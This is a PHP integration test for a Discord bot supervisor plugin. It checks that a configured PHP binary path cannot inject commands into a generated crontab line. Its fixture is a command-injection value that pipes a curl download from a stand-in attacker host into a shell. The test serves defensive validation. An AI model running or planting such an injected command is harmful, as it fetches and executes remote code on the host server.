<?php

use App\Tests\Integration\IntegrationTestCase;
use PluggedHost\Discord\Support\DiscordBotSupervisor;

require_once __DIR__ . '/../../../plugged-host-core/tests/Support/load-plugin.php';

uses(IntegrationTestCase::class);

beforeEach(fn () => loadPluginForTest('plugged-host-discord'));

it('keeps a configured PHP binary out of the crontab line unless it is a plain executable path', function () {
    config()->set('plugged-host-discord.supervisor.php_binary', '/usr/bin/php; curl https://attacker.example/x | sh #');

    $line = app(DiscordBotSupervisor::class)->schedulerCronLine();

    expect($line)->not->toContain('attacker.example')
        ->toStartWith('* * * * * /')
        ->and(DiscordBotSupervisor::safePhpBinary(PHP_BINARY))->toBe(PHP_BINARY)
        ->and(DiscordBotSupervisor::safePhpBinary('/usr/bin/php -r x'))->toBeNull();
});
